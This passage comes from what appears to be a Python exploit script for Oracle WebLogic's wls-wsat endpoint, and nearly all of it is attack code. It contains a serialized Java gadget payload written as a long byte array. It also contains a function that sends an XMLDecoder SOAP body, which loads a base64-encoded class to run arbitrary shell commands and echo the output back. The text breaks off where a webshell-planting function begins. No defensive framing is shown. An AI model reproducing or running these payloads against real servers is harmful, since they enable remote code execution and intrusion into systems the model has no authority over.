index=\"4443\"><byte>111</byte></void><void index=\"4444\"><byte>47</byte></void><void index=\"4445\"><byte>83</byte></void><void index=\"4446\"><byte>101</byte></void><void index=\"4447\"><byte>114</byte></void><void index=\"4448\"><byte>105</byte></void><void index=\"4449\"><byte>97</byte></void><void index=\"4450\"><byte>108</byte></void><void index=\"4451\"><byte>105</byte></void><void index=\"4452\"><byte>122</byte></void><void index=\"4453\"><byte>97</byte></void><void index=\"4454\"><byte>98</byte></void><void index=\"4455\"><byte>108</byte></void><void index=\"4456\"><byte>101</byte></void><void index=\"4457\"><byte>1</byte></void><void index=\"4458\"><byte>0</byte></void><void index=\"4459\"><byte>31</byte></void><void index=\"4460\"><byte>121</byte></void><void index=\"4461\"><byte>115</byte></void><void index=\"4462\"><byte>111</byte></void><void index=\"4463\"><byte>115</byte></void><void index=\"4464\"><byte>101</byte></void><void index=\"4465\"><byte>114</byte></void><void index=\"4466\"><byte>105</byte></void><void index=\"4467\"><byte>97</byte></void><void index=\"4468\"><byte>108</byte></void><void index=\"4469\"><byte>47</byte></void><void index=\"4470\"><byte>112</byte></void><void index=\"4471\"><byte>97</byte></void><void index=\"4472\"><byte>121</byte></void><void index=\"4473\"><byte>108</byte></void><void index=\"4474\"><byte>111</byte></void><void index=\"4475\"><byte>97</byte></void><void index=\"4476\"><byte>100</byte></void><void index=\"4477\"><byte>115</byte></void><void index=\"4478\"><byte>47</byte></void><void index=\"4479\"><byte>117</byte></void><void index=\"4480\"><byte>116</byte></void><void index=\"4481\"><byte>105</byte></void><void index=\"4482\"><byte>108</byte></void><void index=\"4483\"><byte>47</byte></void><void index=\"4484\"><byte>71</byte></void><void index=\"4485\"><byte>97</byte></void><void index=\"4486\"><byte>100</byte></void><void index=\"4487\"><byte>103</byte></void><void index=\"4488\"><byte>101</byte></void><void index=\"4489\"><byte>116</byte></void><void index=\"4490\"><byte>115</byte></void><void index=\"4491\"><byte>0</byte></void><void index=\"4492\"><byte>33</byte></void><void index=\"4493\"><byte>0</byte></void><void index=\"4494\"><byte>2</byte></void><void index=\"4495\"><byte>0</byte></void><void index=\"4496\"><byte>3</byte></void><void index=\"4497\"><byte>0</byte></void><void index=\"4498\"><byte>1</byte></void><void index=\"4499\"><byte>0</byte></void><void index=\"4500\"><byte>4</byte></void><void index=\"4501\"><byte>0</byte></void><void index=\"4502\"><byte>1</byte></void><void index=\"4503\"><byte>0</byte></void><void index=\"4504\"><byte>26</byte></void><void index=\"4505\"><byte>0</byte></void><void index=\"4506\"><byte>5</byte></void><void index=\"4507\"><byte>0</byte></void><void index=\"4508\"><byte>6</byte></void><void index=\"4509\"><byte>0</byte></void><void index=\"4510\"><byte>1</byte></void><void index=\"4511\"><byte>0</byte></void><void index=\"4512\"><byte>7</byte></void><void index=\"4513\"><byte>0</byte></void><void index=\"4514\"><byte>0</byte></void><void index=\"4515\"><byte>0</byte></void><void index=\"4516\"><byte>2</byte></void><void index=\"4517\"><byte>0</byte></void><void index=\"4518\"><byte>8</byte></void><void index=\"4519\"><byte>0</byte></void><void index=\"4520\"><byte>1</byte></void><void index=\"4521\"><byte>0</byte></void><void index=\"4522\"><byte>1</byte></void><void index=\"4523\"><byte>0</byte></void><void index=\"4524\"><byte>10</byte></void><void index=\"4525\"><byte>0</byte></void><void index=\"4526\"><byte>11</byte></void><void index=\"4527\"><byte>0</byte></void><void index=\"4528\"><byte>1</byte></void><void index=\"4529\"><byte>0</byte></void><void index=\"4530\"><byte>12</byte></void><void index=\"4531\"><byte>0</byte></void><void index=\"4532\"><byte>0</byte></void><void index=\"4533\"><byte>0</byte></void><void index=\"4534\"><byte>47</byte></void><void index=\"4535\"><byte>0</byte></void><void index=\"4536\"><byte>1</byte></void><void index=\"4537\"><byte>0</byte></void><void index=\"4538\"><byte>1</byte></void><void index=\"4539\"><byte>0</byte></void><void index=\"4540\"><byte>0</byte></void><void index=\"4541\"><byte>0</byte></void><void index=\"4542\"><byte>5</byte></void><void index=\"4543\"><byte>42</byte></void><void index=\"4544\"><byte>-73</byte></void><void index=\"4545\"><byte>0</byte></void><void index=\"4546\"><byte>1</byte></void><void index=\"4547\"><byte>-79</byte></void><void index=\"4548\"><byte>0</byte></void><void index=\"4549\"><byte>0</byte></void><void index=\"4550\"><byte>0</byte></void><void index=\"4551\"><byte>2</byte></void><void index=\"4552\"><byte>0</byte></void><void index=\"4553\"><byte>13</byte></void><void index=\"4554\"><byte>0</byte></void><void index=\"4555\"><byte>0</byte></void><void index=\"4556\"><byte>0</byte></void><void index=\"4557\"><byte>6</byte></void><void index=\"4558\"><byte>0</byte></void><void index=\"4559\"><byte>1</byte></void><void index=\"4560\"><byte>0</byte></void><void index=\"4561\"><byte>0</byte></void><void index=\"4562\"><byte>0</byte></void><void index=\"4563\"><byte>60</byte></void><void index=\"4564\"><byte>0</byte></void><void index=\"4565\"><byte>14</byte></void><void index=\"4566\"><byte>0</byte></void><void index=\"4567\"><byte>0</byte></void><void index=\"4568\"><byte>0</byte></void><void index=\"4569\"><byte>12</byte></void><void index=\"4570\"><byte>0</byte></void><void index=\"4571\"><byte>1</byte></void><void index=\"4572\"><byte>0</byte></void><void index=\"4573\"><byte>0</byte></void><void index=\"4574\"><byte>0</byte></void><void index=\"4575\"><byte>5</byte></void><void index=\"4576\"><byte>0</byte></void><void index=\"4577\"><byte>15</byte></void><void index=\"4578\"><byte>0</byte></void><void index=\"4579\"><byte>18</byte></void><void index=\"4580\"><byte>0</byte></void><void index=\"4581\"><byte>0</byte></void><void index=\"4582\"><byte>0</byte></void><void index=\"4583\"><byte>2</byte></void><void index=\"4584\"><byte>0</byte></void><void index=\"4585\"><byte>19</byte></void><void index=\"4586\"><byte>0</byte></void><void index=\"4587\"><byte>0</byte></void><void index=\"4588\"><byte>0</byte></void><void index=\"4589\"><byte>2</byte></void><void index=\"4590\"><byte>0</byte></void><void index=\"4591\"><byte>20</byte></void><void index=\"4592\"><byte>0</byte></void><void index=\"4593\"><byte>17</byte></void><void index=\"4594\"><byte>0</byte></void><void index=\"4595\"><byte>0</byte></void><void index=\"4596\"><byte>0</byte></void><void index=\"4597\"><byte>10</byte></void><void index=\"4598\"><byte>0</byte></void><void index=\"4599\"><byte>1</byte></void><void index=\"4600\"><byte>0</byte></void><void index=\"4601\"><byte>2</byte></void><void index=\"4602\"><byte>0</byte></void><void index=\"4603\"><byte>22</byte></void><void index=\"4604\"><byte>0</byte></void><void index=\"4605\"><byte>16</byte></void><void index=\"4606\"><byte>0</byte></void><void index=\"4607\"><byte>9</byte></void><void index=\"4608\"><byte>112</byte></void><void index=\"4609\"><byte>116</byte></void><void index=\"4610\"><byte>0</byte></void><void index=\"4611\"><byte>4</byte></void><void index=\"4612\"><byte>80</byte></void><void index=\"4613\"><byte>119</byte></void><void index=\"4614\"><byte>110</byte></void><void index=\"4615\"><byte>114</byte></void><void index=\"4616\"><byte>112</byte></void><void index=\"4617\"><byte>119</byte></void><void index=\"4618\"><byte>1</byte></void><void index=\"4619\"><byte>0</byte></void><void index=\"4620\"><byte>120</byte></void><void index=\"4621\"><byte>115</byte></void><void index=\"4622\"><byte>125</byte></void><void index=\"4623\"><byte>0</byte></void><void index=\"4624\"><byte>0</byte></void><void index=\"4625\"><byte>0</byte></void><void index=\"4626\"><byte>1</byte></void><void index=\"4627\"><byte>0</byte></void><void index=\"4628\"><byte>29</byte></void><void index=\"4629\"><byte>106</byte></void><void index=\"4630\"><byte>97</byte></void><void index=\"4631\"><byte>118</byte></void><void index=\"4632\"><byte>97</byte></void><void index=\"4633\"><byte>120</byte></void><void index=\"4634\"><byte>46</byte></void><void index=\"4635\"><byte>120</byte></void><void index=\"4636\"><byte>109</byte></void><void index=\"4637\"><byte>108</byte></void><void index=\"4638\"><byte>46</byte></void><void index=\"4639\"><byte>116</byte></void><void index=\"4640\"><byte>114</byte></void><void index=\"4641\"><byte>97</byte></void><void index=\"4642\"><byte>110</byte></void><void index=\"4643\"><byte>115</byte></void><void index=\"4644\"><byte>102</byte></void><void index=\"4645\"><byte>111</byte></void><void index=\"4646\"><byte>114</byte></void><void index=\"4647\"><byte>109</byte></void><void index=\"4648\"><byte>46</byte></void><void index=\"4649\"><byte>84</byte></void><void index=\"4650\"><byte>101</byte></void><void index=\"4651\"><byte>109</byte></void><void index=\"4652\"><byte>112</byte></void><void index=\"4653\"><byte>108</byte></void><void index=\"4654\"><byte>97</byte></void><void index=\"4655\"><byte>116</byte></void><void index=\"4656\"><byte>101</byte></void><void index=\"4657\"><byte>115</byte></void><void index=\"4658\"><byte>120</byte></void><void index=\"4659\"><byte>114</byte></void><void index=\"4660\"><byte>0</byte></void><void index=\"4661\"><byte>23</byte></void><void index=\"4662\"><byte>106</byte></void><void index=\"4663\"><byte>97</byte></void><void index=\"4664\"><byte>118</byte></void><void index=\"4665\"><byte>97</byte></void><void index=\"4666\"><byte>46</byte></void><void index=\"4667\"><byte>108</byte></void><void index=\"4668\"><byte>97</byte></void><void index=\"4669\"><byte>110</byte></void><void index=\"4670\"><byte>103</byte></void><void index=\"4671\"><byte>46</byte></void><void index=\"4672\"><byte>114</byte></void><void index=\"4673\"><byte>101</byte></void><void index=\"4674\"><byte>102</byte></void><void index=\"4675\"><byte>108</byte></void><void index=\"4676\"><byte>101</byte></void><void index=\"4677\"><byte>99</byte></void><void index=\"4678\"><byte>116</byte></void><void index=\"4679\"><byte>46</byte></void><void index=\"4680\"><byte>80</byte></void><void index=\"4681\"><byte>114</byte></void><void index=\"4682\"><byte>111</byte></void><void index=\"4683\"><byte>120</byte></void><void index=\"4684\"><byte>121</byte></void><void index=\"4685\"><byte>-31</byte></void><void index=\"4686\"><byte>39</byte></void><void index=\"4687\"><byte>-38</byte></void><void index=\"4688\"><byte>32</byte></void><void index=\"4689\"><byte>-52</byte></void><void index=\"4690\"><byte>16</byte></void><void index=\"4691\"><byte>67</byte></void><void index=\"4692\"><byte>-53</byte></void><void index=\"4693\"><byte>2</byte></void><void index=\"4694\"><byte>0</byte></void><void index=\"4695\"><byte>1</byte></void><void index=\"4696\"><byte>76</byte></void><void index=\"4697\"><byte>0</byte></void><void index=\"4698\"><byte>1</byte></void><void index=\"4699\"><byte>104</byte></void><void index=\"4700\"><byte>116</byte></void><void index=\"4701\"><byte>0</byte></void><void index=\"4702\"><byte>37</byte></void><void index=\"4703\"><byte>76</byte></void><void index=\"4704\"><byte>106</byte></void><void index=\"4705\"><byte>97</byte></void><void index=\"4706\"><byte>118</byte></void><void index=\"4707\"><byte>97</byte></void><void index=\"4708\"><byte>47</byte></void><void index=\"4709\"><byte>108</byte></void><void index=\"4710\"><byte>97</byte></void><void index=\"4711\"><byte>110</byte></void><void index=\"4712\"><byte>103</byte></void><void index=\"4713\"><byte>47</byte></void><void index=\"4714\"><byte>114</byte></void><void index=\"4715\"><byte>101</byte></void><void index=\"4716\"><byte>102</byte></void><void index=\"4717\"><byte>108</byte></void><void index=\"4718\"><byte>101</byte></void><void index=\"4719\"><byte>99</byte></void><void index=\"4720\"><byte>116</byte></void><void index=\"4721\"><byte>47</byte></void><void index=\"4722\"><byte>73</byte></void><void index=\"4723\"><byte>110</byte></void><void index=\"4724\"><byte>118</byte></void><void index=\"4725\"><byte>111</byte></void><void index=\"4726\"><byte>99</byte></void><void index=\"4727\"><byte>97</byte></void><void index=\"4728\"><byte>116</byte></void><void index=\"4729\"><byte>105</byte></void><void index=\"4730\"><byte>111</byte></void><void index=\"4731\"><byte>110</byte></void><void index=\"4732\"><byte>72</byte></void><void index=\"4733\"><byte>97</byte></void><void index=\"4734\"><byte>110</byte></void><void index=\"4735\"><byte>100</byte></void><void index=\"4736\"><byte>108</byte></void><void index=\"4737\"><byte>101</byte></void><void index=\"4738\"><byte>114</byte></void><void index=\"4739\"><byte>59</byte></void><void index=\"4740\"><byte>120</byte></void><void index=\"4741\"><byte>112</byte></void><void index=\"4742\"><byte>115</byte></void><void index=\"4743\"><byte>114</byte></void><void index=\"4744\"><byte>0</byte></void><void index=\"4745\"><byte>50</byte></void><void index=\"4746\"><byte>115</byte></void><void index=\"4747\"><byte>117</byte></void><void index=\"4748\"><byte>110</byte></void><void index=\"4749\"><byte>46</byte></void><void index=\"4750\"><byte>114</byte></void><void index=\"4751\"><byte>101</byte></void><void index=\"4752\"><byte>102</byte></void><void index=\"4753\"><byte>108</byte></void><void index=\"4754\"><byte>101</byte></void><void index=\"4755\"><byte>99</byte></void><void index=\"4756\"><byte>116</byte></void><void index=\"4757\"><byte>46</byte></void><void index=\"4758\"><byte>97</byte></void><void index=\"4759\"><byte>110</byte></void><void index=\"4760\"><byte>110</byte></void><void index=\"4761\"><byte>111</byte></void><void index=\"4762\"><byte>116</byte></void><void index=\"4763\"><byte>97</byte></void><void index=\"4764\"><byte>116</byte></void><void index=\"4765\"><byte>105</byte></void><void index=\"4766\"><byte>111</byte></void><void index=\"4767\"><byte>110</byte></void><void index=\"4768\"><byte>46</byte></void><void index=\"4769\"><byte>65</byte></void><void index=\"4770\"><byte>110</byte></void><void index=\"4771\"><byte>110</byte></void><void index=\"4772\"><byte>111</byte></void><void index=\"4773\"><byte>116</byte></void><void index=\"4774\"><byte>97</byte></void><void index=\"4775\"><byte>116</byte></void><void index=\"4776\"><byte>105</byte></void><void index=\"4777\"><byte>111</byte></void><void index=\"4778\"><byte>110</byte></void><void index=\"4779\"><byte>73</byte></void><void index=\"4780\"><byte>110</byte></void><void index=\"4781\"><byte>118</byte></void><void index=\"4782\"><byte>111</byte></void><void index=\"4783\"><byte>99</byte></void><void index=\"4784\"><byte>97</byte></void><void index=\"4785\"><byte>116</byte></void><void index=\"4786\"><byte>105</byte></void><void index=\"4787\"><byte>111</byte></void><void index=\"4788\"><byte>110</byte></void><void index=\"4789\"><byte>72</byte></void><void index=\"4790\"><byte>97</byte></void><void index=\"4791\"><byte>110</byte></void><void index=\"4792\"><byte>100</byte></void><void index=\"4793\"><byte>108</byte></void><void index=\"4794\"><byte>101</byte></void><void index=\"4795\"><byte>114</byte></void><void index=\"4796\"><byte>85</byte></void><void index=\"4797\"><byte>-54</byte></void><void index=\"4798\"><byte>-11</byte></void><void index=\"4799\"><byte>15</byte></void><void index=\"4800\"><byte>21</byte></void><void index=\"4801\"><byte>-53</byte></void><void index=\"4802\"><byte>126</byte></void><void index=\"4803\"><byte>-91</byte></void><void index=\"4804\"><byte>2</byte></void><void index=\"4805\"><byte>0</byte></void><void index=\"4806\"><byte>2</byte></void><void index=\"4807\"><byte>76</byte></void><void index=\"4808\"><byte>0</byte></void><void index=\"4809\"><byte>12</byte></void><void index=\"4810\"><byte>109</byte></void><void index=\"4811\"><byte>101</byte></void><void index=\"4812\"><byte>109</byte></void><void index=\"4813\"><byte>98</byte></void><void index=\"4814\"><byte>101</byte></void><void index=\"4815\"><byte>114</byte></void><void index=\"4816\"><byte>86</byte></void><void index=\"4817\"><byte>97</byte></void><void index=\"4818\"><byte>108</byte></void><void index=\"4819\"><byte>117</byte></void><void index=\"4820\"><byte>101</byte></void><void index=\"4821\"><byte>115</byte></void><void index=\"4822\"><byte>116</byte></void><void index=\"4823\"><byte>0</byte></void><void index=\"4824\"><byte>15</byte></void><void index=\"4825\"><byte>76</byte></void><void index=\"4826\"><byte>106</byte></void><void index=\"4827\"><byte>97</byte></void><void index=\"4828\"><byte>118</byte></void><void index=\"4829\"><byte>97</byte></void><void index=\"4830\"><byte>47</byte></void><void index=\"4831\"><byte>117</byte></void><void index=\"4832\"><byte>116</byte></void><void index=\"4833\"><byte>105</byte></void><void index=\"4834\"><byte>108</byte></void><void index=\"4835\"><byte>47</byte></void><void index=\"4836\"><byte>77</byte></void><void index=\"4837\"><byte>97</byte></void><void index=\"4838\"><byte>112</byte></void><void index=\"4839\"><byte>59</byte></void><void index=\"4840\"><byte>76</byte></void><void index=\"4841\"><byte>0</byte></void><void index=\"4842\"><byte>4</byte></void><void index=\"4843\"><byte>116</byte></void><void index=\"4844\"><byte>121</byte></void><void index=\"4845\"><byte>112</byte></void><void index=\"4846\"><byte>101</byte></void><void index=\"4847\"><byte>116</byte></void><void index=\"4848\"><byte>0</byte></void><void index=\"4849\"><byte>17</byte></void><void index=\"4850\"><byte>76</byte></void><void index=\"4851\"><byte>106</byte></void><void index=\"4852\"><byte>97</byte></void><void index=\"4853\"><byte>118</byte></void><void index=\"4854\"><byte>97</byte></void><void index=\"4855\"><byte>47</byte></void><void index=\"4856\"><byte>108</byte></void><void index=\"4857\"><byte>97</byte></void><void index=\"4858\"><byte>110</byte></void><void index=\"4859\"><byte>103</byte></void><void index=\"4860\"><byte>47</byte></void><void index=\"4861\"><byte>67</byte></void><void index=\"4862\"><byte>108</byte></void><void index=\"4863\"><byte>97</byte></void><void index=\"4864\"><byte>115</byte></void><void index=\"4865\"><byte>115</byte></void><void index=\"4866\"><byte>59</byte></void><void index=\"4867\"><byte>120</byte></void><void index=\"4868\"><byte>112</byte></void><void index=\"4869\"><byte>115</byte></void><void index=\"4870\"><byte>114</byte></void><void index=\"4871\"><byte>0</byte></void><void index=\"4872\"><byte>17</byte></void><void index=\"4873\"><byte>106</byte></void><void index=\"4874\"><byte>97</byte></void><void index=\"4875\"><byte>118</byte></void><void index=\"4876\"><byte>97</byte></void><void index=\"4877\"><byte>46</byte></void><void index=\"4878\"><byte>117</byte></void><void index=\"4879\"><byte>116</byte></void><void index=\"4880\"><byte>105</byte></void><void index=\"4881\"><byte>108</byte></void><void index=\"4882\"><byte>46</byte></void><void index=\"4883\"><byte>72</byte></void><void index=\"4884\"><byte>97</byte></void><void index=\"4885\"><byte>115</byte></void><void index=\"4886\"><byte>104</byte></void><void index=\"4887\"><byte>77</byte></void><void index=\"4888\"><byte>97</byte></void><void index=\"4889\"><byte>112</byte></void><void index=\"4890\"><byte>5</byte></void><void index=\"4891\"><byte>7</byte></void><void index=\"4892\"><byte>-38</byte></void><void index=\"4893\"><byte>-63</byte></void><void index=\"4894\"><byte>-61</byte></void><void index=\"4895\"><byte>22</byte></void><void index=\"4896\"><byte>96</byte></void><void index=\"4897\"><byte>-47</byte></void><void index=\"4898\"><byte>3</byte></void><void index=\"4899\"><byte>0</byte></void><void index=\"4900\"><byte>2</byte></void><void index=\"4901\"><byte>70</byte></void><void index=\"4902\"><byte>0</byte></void><void index=\"4903\"><byte>10</byte></void><void index=\"4904\"><byte>108</byte></void><void index=\"4905\"><byte>111</byte></void><void index=\"4906\"><byte>97</byte></void><void index=\"4907\"><byte>100</byte></void><void index=\"4908\"><byte>70</byte></void><void index=\"4909\"><byte>97</byte></void><void index=\"4910\"><byte>99</byte></void><void index=\"4911\"><byte>116</byte></void><void index=\"4912\"><byte>111</byte></void><void index=\"4913\"><byte>114</byte></void><void index=\"4914\"><byte>73</byte></void><void index=\"4915\"><byte>0</byte></void><void index=\"4916\"><byte>9</byte></void><void index=\"4917\"><byte>116</byte></void><void index=\"4918\"><byte>104</byte></void><void index=\"4919\"><byte>114</byte></void><void index=\"4920\"><byte>101</byte></void><void index=\"4921\"><byte>115</byte></void><void index=\"4922\"><byte>104</byte></void><void index=\"4923\"><byte>111</byte></void><void index=\"4924\"><byte>108</byte></void><void index=\"4925\"><byte>100</byte></void><void index=\"4926\"><byte>120</byte></void><void index=\"4927\"><byte>112</byte></void><void index=\"4928\"><byte>63</byte></void><void index=\"4929\"><byte>64</byte></void><void index=\"4930\"><byte>0</byte></void><void index=\"4931\"><byte>0</byte></void><void index=\"4932\"><byte>0</byte></void><void index=\"4933\"><byte>0</byte></void><void index=\"4934\"><byte>0</byte></void><void index=\"4935\"><byte>12</byte></void><void index=\"4936\"><byte>119</byte></void><void index=\"4937\"><byte>8</byte></void><void index=\"4938\"><byte>0</byte></void><void index=\"4939\"><byte>0</byte></void><void index=\"4940\"><byte>0</byte></void><void index=\"4941\"><byte>16</byte></void><void index=\"4942\"><byte>0</byte></void><void index=\"4943\"><byte>0</byte></void><void index=\"4944\"><byte>0</byte></void><void index=\"4945\"><byte>1</byte></void><void index=\"4946\"><byte>116</byte></void><void index=\"4947\"><byte>0</byte></void><void index=\"4948\"><byte>8</byte></void><void index=\"4949\"><byte>102</byte></void><void index=\"4950\"><byte>53</byte></void><void index=\"4951\"><byte>97</byte></void><void index=\"4952\"><byte>53</byte></void><void index=\"4953\"><byte>97</byte></void><void index=\"4954\"><byte>54</byte></void><void index=\"4955\"><byte>48</byte></void><void index=\"4956\"><byte>56</byte></void><void index=\"4957\"><byte>113</byte></void><void index=\"4958\"><byte>0</byte></void><void index=\"4959\"><byte>126</byte></void><void index=\"4960\"><byte>0</byte></void><void index=\"4961\"><byte>9</byte></void><void index=\"4962\"><byte>120</byte></void><void index=\"4963\"><byte>118</byte></void><void index=\"4964\"><byte>114</byte></void><void index=\"4965\"><byte>0</byte></void><void index=\"4966\"><byte>29</byte></void><void index=\"4967\"><byte>106</byte></void><void index=\"4968\"><byte>97</byte></void><void index=\"4969\"><byte>118</byte></void><void index=\"4970\"><byte>97</byte></void><void index=\"4971\"><byte>120</byte></void><void index=\"4972\"><byte>46</byte></void><void index=\"4973\"><byte>120</byte></void><void index=\"4974\"><byte>109</byte></void><void index=\"4975\"><byte>108</byte></void><void index=\"4976\"><byte>46</byte></void><void index=\"4977\"><byte>116</byte></void><void index=\"4978\"><byte>114</byte></void><void index=\"4979\"><byte>97</byte></void><void index=\"4980\"><byte>110</byte></void><void index=\"4981\"><byte>115</byte></void><void index=\"4982\"><byte>102</byte></void><void index=\"4983\"><byte>111</byte></void><void index=\"4984\"><byte>114</byte></void><void index=\"4985\"><byte>109</byte></void><void index=\"4986\"><byte>46</byte></void><void index=\"4987\"><byte>84</byte></void><void index=\"4988\"><byte>101</byte></void><void index=\"4989\"><byte>109</byte></void><void index=\"4990\"><byte>112</byte></void><void index=\"4991\"><byte>108</byte></void><void index=\"4992\"><byte>97</byte></void><void index=\"4993\"><byte>116</byte></void><void index=\"4994\"><byte>101</byte></void><void index=\"4995\"><byte>115</byte></void><void index=\"4996\"><byte>0</byte></void><void index=\"4997\"><byte>0</byte></void><void index=\"4998\"><byte>0</byte></void><void index=\"4999\"><byte>0</byte></void><void index=\"5000\"><byte>0</byte></void><void index=\"5001\"><byte>0</byte></void><void index=\"5002\"><byte>0</byte></void><void index=\"5003\"><byte>0</byte></void><void index=\"5004\"><byte>0</byte></void><void index=\"5005\"><byte>0</byte></void><void index=\"5006\"><byte>0</byte></void><void index=\"5007\"><byte>120</byte></void><void index=\"5008\"><byte>112</byte></void><void index=\"5009\"><byte>120</byte></void></array> </void></class> </work:WorkContext> </soapenv:Header> <soapenv:Body></soapenv:Body></soapenv:Envelope>\"\"\" url = \" %s /wls-wsat/CoordinatorPortType\" % ( ip ) rsp = requests . post ( url , data = body , verify = False , headers = headers ) logger . info ( \" \\r\\n \" + rsp . text ) def weblogic_12_1_3 ( ip , cmd ): headers = { \"Accept-Language\" : \"zh-CN,zh;q=0.9,en;q=0.8\" , \"User-Agent\" : \"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\" , \"Content-Type\" : \"text/xml\" } body = '''<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <java> <class><string>org.slf4j.ext.EventData</string> <void> <string> <java> <void class=\"sun.misc.BASE64Decoder\"> <void method=\"decodeBuffer\" id=\"byte_arr\"> <string>yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7</string> </void> </void> <void class=\"org.mozilla.classfile.DefiningClassLoader\"> <void method=\"defineClass\"> <string>ResultBaseExec</string> <object idref=\"byte_arr\"></object> <void method=\"newInstance\"> <void method=\"do_exec\" id=\"result\"> <string> %s </string> </void> </void> </void> </void> <void class=\"java.lang.Thread\" method=\"currentThread\"> <void method=\"getCurrentWork\" id=\"current_work\"> <void method=\"getClass\"> <void method=\"getDeclaredField\"> <string>connectionHandler</string> <void method=\"setAccessible\"><boolean>true</boolean></void> <void method=\"get\"> <object idref=\"current_work\"></object> <void method=\"getServletRequest\"> <void method=\"getResponse\"> <void method=\"getServletOutputStream\"> <void method=\"writeStream\"> <object class=\"weblogic.xml.util.StringInputStream\"><object idref=\"result\"></object></object> </void> <void method=\"flush\"/> </void> <void method=\"getWriter\"><void method=\"write\"><string></string></void></void> </void> </void> </void> </void> </void> </void> </void> </java> </string> </void> </class> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>''' % ( cmd ) url = \" %s /wls-wsat/CoordinatorPortType\" % ( ip ) rsp = requests . post ( url , data = body , verify = False , headers = headers ) logger . info ( \" \\r\\n \" + rsp . text ) def webshell_10_3_6 ( ip ): body = '''<?xml version=\"1.0\" encoding=\"utf-8\" ?> <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> 